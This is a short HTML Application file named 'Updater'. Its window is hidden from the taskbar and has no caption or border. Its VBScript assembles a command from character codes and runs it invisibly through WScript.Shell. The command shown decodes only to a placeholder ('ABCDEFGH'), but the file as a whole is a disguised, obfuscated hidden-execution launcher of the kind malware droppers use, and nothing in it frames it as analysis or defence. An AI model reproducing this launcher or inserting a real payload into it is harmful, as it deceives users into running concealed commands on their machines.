<html><head>
<HTA:APPLICATION ID="Updater" APPLICATIONNAME="Updater" SHOWINTASKBAR="no" CAPTION="no" SYSMENU="no" BORDER="none" SCROLL="no" SINGLEINSTANCE="yes" WINDOWSTATE="normal">
<script language="VBScript">
Dim ShellObj, CmdLine, StyleFlag, Codes, i
Set ShellObj = CreateObject("Wscript.Shell")
Codes = Array(65,66,67,68,69,70,71,72)
CmdLine = ""
For i = 0 To UBound(Codes)
  CmdLine = CmdLine & Chr(Codes(i))
Next
StyleFlag = 0
ShellObj.Run CmdLine, StyleFlag
</script>
</head><body></body></html>
